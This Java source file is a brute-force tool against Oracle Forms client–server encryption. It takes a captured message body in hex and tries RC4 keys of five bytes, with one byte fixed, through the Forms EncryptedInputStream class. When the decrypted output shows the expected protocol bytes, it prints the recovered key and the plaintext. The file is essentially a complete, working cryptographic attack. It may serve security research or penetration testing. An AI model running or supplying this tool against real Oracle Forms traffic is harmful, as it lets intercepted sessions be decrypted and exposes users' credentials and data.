import java.io.*;
import oracle.forms.engine.FormsMessage;
import oracle.forms.engine.Message;
import oracle.forms.net.EncryptedInputStream;

class OracleFormsBruteForce{

    // Borrowed from https://stackoverflow.com/questions/140131/convert-a-string-representation-of-a-hex-dump-to-a-byte-array-using-java
    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                 + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    public static String byteArrayToHex(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for(byte b: a)
            sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }

    private static void printMessage(Message m){
        for (int i=0;i<m.size();i++){
            System.out.println("Property "+i+": "+m.getPropertyAt(i)+" Type: "+m.getPropertyTypeAt(i));
            System.out.println("--- Value: "+m.getValueAt(i).toString());
            System.out.flush();
        }
    }

    public static void main(String argv[]){
    	String bodyHex=argv[0];
        System.out.println(bodyHex);
        byte[] body=hexStringToByteArray(bodyHex);
        System.out.println("Body: "+body.length+" byte(s)");
        if (body.length==0) return;
        byte[] rc4Key=new byte[5];
        byte[] res=new byte[body.length];        
        for(long l=0;l<0xffffffffL;l++){
            rc4Key[0]=(byte)((l & 0xff000000) >> 24);        
            rc4Key[1]=(byte)((l & 0xff0000) >> 16);        
            rc4Key[2]=-82;        
            rc4Key[3]=(byte)((l & 0xff00) >> 8);
            rc4Key[4]=(byte)(l & 0xff);
            if (l % 10000 == 0)
              System.out.println("Trying: "+byteArrayToHex(rc4Key));
            EncryptedInputStream eis=new EncryptedInputStream(new ByteArrayInputStream(body));
            eis.setEncryptKey(rc4Key);
            try{
                eis.read(res,0,body.length);
                if (res[0]==0x10 && res[1]==0x00 && res[res.length-1]==0x01 && res[res.length-2]==-16){
                    System.out.println("KEY FOUND: "+byteArrayToHex(rc4Key));    
                    System.out.println(byteArrayToHex(res));
                    return;
                }
            }catch(IOException ioe){
                System.out.println("IOException");    
                return;
            }

        }
    }
}
